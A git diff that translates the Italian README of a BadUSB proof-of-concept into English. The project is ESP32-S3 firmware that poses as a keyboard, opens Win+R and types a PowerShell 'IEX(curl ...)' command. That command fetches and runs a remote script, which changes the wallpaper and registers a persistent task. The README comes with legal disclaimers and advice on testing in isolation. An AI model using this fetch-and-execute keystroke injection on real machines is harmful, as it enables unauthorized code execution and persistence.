@@ -5,274 +5,277 @@
 
 > **Security Research & Educational Project** - Proof-of-concept firmware for USB HID attacks and penetration testing
 
-Firmware per **LilyGo T-Dongle-S3** (ESP32-S3) che emula una tastiera USB HID e avvia uno script PowerShell per modificare il desktop di Windows. Questo è un progetto didattico di security research che dimostra le vulnerabilità dei sistemi non protetti da BadUSB attacks.
+Firmware for the **LilyGo T-Dongle-S3** (ESP32-S3) that emulates a USB HID keyboard and launches a PowerShell script to modify the desktop wallpaper on Windows. This is an educational security research project demonstrating vulnerabilities in systems that are not protected against BadUSB attacks.
 
 ---
 
 ## ⚠️ Legal Disclaimer
 
-**ATTENZIONE: Questo progetto è solo a scopo didattico e di ricerca sulla sicurezza.**
+**WARNING: This project is for educational and research purposes only.**
 
-- ✋ **NON** utilizzare su computer che non possiedi o senza **permesso esplicito** del proprietario
-- ⚖️ L'uso non autorizzato potrebbe violare leggi sulla sicurezza informatica
-- 🔒 Testa **ESCLUSIVAMENTE** in ambienti isolati (VM, sandbox, computer di laboratorio)
-- 📋 Usa solo a scopo **educativo e di penetration testing autorizzato**
-
----
-
-## 📋 Caratteristiche
-
-✅ Emulazione USB HID keyboard (tastiera virtuale)  
-✅ Esecuzione automatica di comandi PowerShell  
-✅ Download e esecuzione di script remoti  
-✅ Modifica dello sfondo desktop di Windows  
-✅ EEPROM configuration & persistence  
-✅ Codice modulare e facilmente personalizzabile  
+- ✋ **DO NOT** use this on computers you do not own or without the **explicit permission** of the owner
+- ⚖️ Unauthorized use may violate computer crime laws
+- 🔒 Test **ONLY** in isolated environments (VMs, sandboxes, or lab machines)
+- 📋 Use only for **educational purposes and authorized penetration testing**
 
 ---
 
-## 🛠️ Requisiti Hardware
+## 📋 Features
 
-- **LilyGo T-Dongle-S3** (scheda di sviluppo con ESP32-S3)
-- Cavo **USB Type-C** (per flashing e alimentazione)
-- Computer con **Windows 10/11** (target - per i test)
-- Ambiente di test isolato (VM consigliata)
-
-## 📦 Requisiti Software
-
-- **PlatformIO** (estensione VS Code oppure CLI)
-- Driver USB per LilyGo T-Dongle-S3
-- **Python 3.x** (per eseguire build di PlatformIO)
-- **Git** (per clonare il repository)
+✅ Emulation of a USB HID keyboard (virtual keyboard)
+✅ Automatic execution of PowerShell commands
+✅ Download and execution of remote scripts
+✅ Modification of Windows desktop wallpaper
+✅ EEPROM configuration & persistence
+✅ Modular and easily customizable code
 
 ---
 
-## 📁 Struttura del Repository
+## 🛠️ Hardware Requirements
+
+- **LilyGo T-Dongle-S3** (ESP32-S3 development board)
+- **USB Type-C** cable (for flashing and power)
+- Windows 10/11 computer (target for testing)
+- Isolated test environment (VM recommended)
+
+## 📦 Software Requirements
+
+- **PlatformIO** (VS Code extension or CLI)
+- USB drivers for LilyGo T-Dongle-S3
+- **Python 3.x** (for PlatformIO builds)
+- **Git** (to clone the repository)
+
+---
+
+## 📁 Repository Structure
 
 ```
 T-Dongle-S3_Desktop_Modifier/
 ├── src/
-│   └── main.cpp                    # Firmware ESP32-S3 (HID keyboard emulator)
+│   └── main.cpp                    # ESP32-S3 firmware (HID keyboard emulator)
 ├── scripts/
 │   ├── bootstrap.ps1               # Entry point dello script
 │   ├── Set-Wallpaper.ps1           # Modifica lo sfondo
 │   ├── Register-WallpaperTask.ps1  # Registra task persistente
 │   └── ...
-├── platformio.ini                  # Configurazione PlatformIO
-├── README.md                       # Questo file
+├── platformio.ini                  # PlatformIO configuration
+├── README_it.md                    # Italian README
+├── README.md                       # This file
 └── LICENSE                         # MIT License
 ```
 
 ---
 
-## 🚀 Come Funziona
+## 🚀 How It Works
 
-### Flusso di Esecuzione
+### Execution Flow
 
 ```
 ┌─────────────────────────────────────────────────────────────────┐
-│ 1. Accendi il T-Dongle-S3 e collegalo via USB                  │
+│ 1. Power on the T-Dongle-S3 and connect it via USB              │
 ├─────────────────────────────────────────────────────────────────┤
-│ 2. Dispositivo viene riconosciuto come tastiera USB             │
+│ 2. The device is recognized as a USB keyboard                    │
 ├─────────────────────────────────────────────────────────────────┤
-│ 3. Firmware emula: Win + R (apre "Esegui")                      │
+│ 3. Firmware emulates: Win + R (opens "Run")                      │
 ├─────────────────────────────────────────────────────────────────┤
-│ 4. Invia comando PowerShell via tassi virtuali                  │
-│    Esempio: powershell -Command "IEX(curl...)"                 │
+│ 4. Sends a PowerShell command via virtual keystrokes             │
+│    Example: powershell -Command "IEX(curl... )"                │
 ├─────────────────────────────────────────────────────────────────┤
-│ 5. PowerShell scarica bootstrap.ps1 da GitHub                   │
+│ 5. PowerShell downloads bootstrap.ps1 from GitHub                │
 ├─────────────────────────────────────────────────────────────────┤
-│ 6. Script esegue:                                               │
-│    - Set-Wallpaper.ps1 (cambia sfondo)                          │
-│    - Register-WallpaperTask.ps1 (rende persistente)             │
+│ 6. The script executes:                                           │
+│    - Set-Wallpaper.ps1 (changes the wallpaper)                   │
+│    - Register-WallpaperTask.ps1 (makes it persistent)            │
 └─────────────────────────────────────────────────────────────────┘
 ```
 
-### Dettagli Tecnici
+### Technical Details
 
-- Il firmware risiede in `src/main.cpp`
-- L'URL del payload PowerShell è definito nella costante `URL`
-- Tutti gli script PowerShell sono in `scripts/`
-- Per motivi di sicurezza, **DEVI personalizzare l'URL** prima di usare il dispositivo
+- Firmware source: `src/main.cpp`
+- The PowerShell payload URL is defined in the `URL` constant
+- All PowerShell scripts are located in the `scripts/` folder
+- For safety, **YOU MUST** customize the URL before using the device
 
 ---
 
 ## 🚀 Quick Start
 
-### 1. Clona il Repository
+### 1. Clone the Repository
 
 ```bash
 git clone https://github.com/Gory-git/T-Dongle-S3_Desktop_Modifier.git
 cd T-Dongle-S3_Desktop_Modifier
 ```
 
-### 2. Installa PlatformIO
+### 2. Install PlatformIO
 
-**Via VS Code (consigliato):**
-- Installa l'estensione **PlatformIO IDE** dal VS Code Marketplace
-- Riavvia VS Code
+**Via VS Code (recommended):**
+- Install the **PlatformIO IDE** extension from the VS Code Marketplace
+- Restart VS Code
 
 **Via CLI:**
+
 ```bash
 pip install platformio
 ```
 
-### 3. Modifica il Payload (IMPORTANTE!)
+### 3. Modify the Payload (IMPORTANT!)
 
-Apri `src/main.cpp` e modifica la costante `URL` per puntare al tuo script di test:
+Open `src/main.cpp` and modify the `URL` constant to point to your test script:
 
 ```cpp
 const char* URL = "https://your-domain.com/your-script.ps1";
 ```
 
-**Per il testing iniziale**, punta a uno script locale o di test controllato da te.
+**For initial testing**, point to a local or otherwise controlled test script.
 
-### 4. Compila il Firmware
+### 4. Build the Firmware
 
-**Con VS Code:**
-- Clicca su `PlatformIO` nella sidebar
-- Seleziona `Build`
+**With VS Code:**
+- Click `PlatformIO` in the sidebar
+- Select `Build`
 
-**Con CLI:**
+**With CLI:**
+
 ```bash
 pio run
 ```
 
-### 5. Carica il Firmware
+### 5. Upload the Firmware
 
-**Con VS Code:**
-- Clicca su `Upload` (con la board collegata via USB)
+**With VS Code:**
+- Click `Upload` (with the board connected via USB)
 
-**Con CLI:**
+**With CLI:**
+
 ```bash
 pio run -t upload
 ```
 
-### 6. Testa in Ambiente Isolato
+### 6. Test in an Isolated Environment
 
-- Usa una **VM Windows** con snapshot attivo
-- Disconnetti la rete o usa una VLAN isolata
-- Collega il T-Dongle-S3
-- Osserva il comportamento
+- Use a **Windows VM** with snapshots enabled
+- Disconnect the network or use an isolated VLAN
+- Connect the T-Dongle-S3
+- Observe the behavior
 
 ---
 
-## ⚙️ Personalizzazione
+## ⚙️ Customization
 
-### Cambiare il Comando PowerShell
+### Change the PowerShell command
 
-Modifica `src/main.cpp`:
+Modify `src/main.cpp`:
 
 ```cpp
 const char* URL = "https://your-server.com/your-script.ps1";
 const char* COMMAND = "powershell -Command \"IEX(curl -Uri '" + URL + "')\"";
 ```
 
-### Ospitare Script Localmente
+### Host Scripts Locally
 
-Per test rapidi senza dipendenze Internet:
+For quick tests without Internet:
 
 ```bash
-# Avvia un web server locale
+# Start a local web server
 python -m http.server 8000
 
-# Modifica URL in main.cpp a:
+# Set the URL in main.cpp to:
 const char* URL = "http://192.168.X.X:8000/bootstrap.ps1";
 ```
 
-### Aggiungere Delay
+### Add Delays
 
-Se vuoi aggiungere un delay tra i tasti (utile per sistemi lenti):
+If you need extra delay between key events (useful for slow systems):
 
 ```cpp
-delay(100);  // Aumenta il delay tra i tasti (in ms)
+delay(100);  // Increase delay between keystrokes (milliseconds)
 ```
 
 ---
 
-## 🔒 Sicurezza e Best Practices
+## 🔒 Security and Best Practices
 
-### ✅ Come Testare Sicuramente
+### ✅ How to test safely
 
-1. **Usa una VM Windows**
+1. **Use a Windows VM**
    ```
    VirtualBox / VMware / Hyper-V
-   → Crea uno snapshot prima di testare
-   → Puoi ripristinare facilmente se necessario
+   → Create a snapshot before testing
+   → Restore snapshot if needed
    ```
 
-2. **Isola la Rete**
+2. **Isolate the network**
    ```
-   - Disconnetti la rete della VM
-   - Oppure usa una VLAN isolata
-   - Oppure usa un firewall locale
+   - Disconnect the VM network
+   - Or use an isolated VLAN
+   - Or use a local firewall
    ```
 
-3. **Analizza lo Script PowerShell Prima**
+3. **Review the PowerShell script first**
    ```powershell
-   # Esegui manualmente lo script per vedere cosa fa
+   # Run the script manually to inspect behavior
    . .\scripts\bootstrap.ps1
    ```
 
-4. **Usa Antivirus in Test**
+4. **Use antivirus during testing**
    ```
-   - Attiva Windows Defender
-   - Controlla i log di Windows Event Viewer
-   - Monitora le modifiche al sistema
+   - Enable Windows Defender
+   - Check Windows Event Viewer logs
+   - Monitor system changes
    ```
 
-### ❌ Cosa NON Fare
+### ❌ What NOT to do
 
-- Non usare su computer altrui senza permesso esplicito
-- Non distribuire il firmware su internet
-- Non usare per scopi di intrusione o danno
-- Non testare su reti di produzione
+- Do not use on other people's computers without explicit permission
+- Do not distribute the firmware online
+- Do not use for intrusion or harmful purposes
+- Do not test on production networks
 
 ---
 
 ## 🐛 Troubleshooting
 
-| Problema | Soluzione |
-|----------|-----------|
-| **Firmware non si carica** | Controlla che il driver USB sia installato; prova PlatformIO CLI |
-| **Tastiera non riconosciuta** | Riavvia il sistema o controlla la configurazione USB in platformio.ini |
-| **Script PowerShell non esegue** | Verifica che l'URL sia raggiungibile e che PowerShell execution policy lo consenta |
-| **Errori di compilazione** | Assicurati che PlatformIO abbia tutti i board manager: `pio boards \| grep esp32-s3` |
+| Problem | Solution |
+|--------:|:--------|
+| **Firmware won't upload** | Check USB drivers; try PlatformIO CLI |
+| **Keyboard not recognized** | Reboot the system or check USB configuration in platformio.ini |
+| **PowerShell script doesn't run** | Ensure the URL is reachable and PowerShell execution policy allows it |
+| **Compilation errors** | Ensure PlatformIO board packages are installed: `pio boards | grep esp32-s3` |
 
 ---
 
-## 📚 Risorse Utili
+## 📚 Useful Resources
 
 - [LilyGo T-Dongle-S3 Documentation](https://github.com/Xinyuan-LilyGO/T-Dongle-S3)
 - [ESP32-S3 USB Device Documentation](https://docs.espressif.com/projects/esp-idf/en/latest/)
 - [PlatformIO Documentation](https://docs.platformio.org/)
 - [USB HID Specification](https://www.usb.org/hid)
-- [PowerShell Security Best Practices](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)
+- [PowerShell Security Best Practices](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)
 
 ---
 
-## 🎓 Concetti Appresi
+## 🎓 Learning Outcomes
 
-Questo progetto insegna:
+This project teaches:
 
-- ✏️ **USB HID Protocol** - Come emulare una tastiera USB
-- 💻 **Embedded Systems** - Programmazione ESP32-S3 con PlatformIO
-- 🔐 **Security Research** - BadUSB attacks e loro mitigazioni
-- 📜 **PowerShell Automation** - Script automation su Windows
-- ⚠️ **Responsible Disclosure** - Importanza dell'etica nel security research
-
----
-
-## 📝 Licenza
-
-Questo repository è rilasciato sotto licenza **MIT**.  
-Vedi il file [LICENSE](LICENSE) per i dettagli completi.
+- ✏️ **USB HID Protocol** - How to emulate a USB keyboard
+- 💻 **Embedded Systems** - Programming the ESP32-S3 with PlatformIO
+- 🔐 **Security Research** - BadUSB attacks and mitigations
+- 📜 **PowerShell Automation** - Script automation on Windows
+- ⚠️ **Responsible Disclosure** - Importance of ethics in security research
 
 ---
 
-## 💬 Supporto e Domande
+## 📝 License
 
-- 📧 **Issues**: Apri un [issue su GitHub](https://github.com/Gory-git/T-Dongle-S3_Desktop_Modifier/issues) per bug reports
-- 💡 **Discussions**: Usa [GitHub Discussions](https://github.com/Gory-git/T-Dongle-S3_Desktop_Modifier/discussions) per domande generali
-- 🔒 **Security**: Se trovi vulnerabilità, contattami direttamente anziché aprire issue pubblici
+This repository is released under the **MIT License**.
+See the [LICENSE](LICENSE) file for full details.
 
+---
+
+## 💬 Support & Questions
+
+- 📧 **Issues**: Open an [issue on GitHub](https://github.com/Gory-git/T-Dongle-S3_Desktop_Modifier/issues)
+- 💡 **Discussions**: Use [GitHub Discussions](https://github.com/Gory-git/T-Dongle-S3_Desktop_Modifier/discussions)
+- 🔒 **Security**: If you discover vulnerabilities, contact me directly instead of opening a public issue
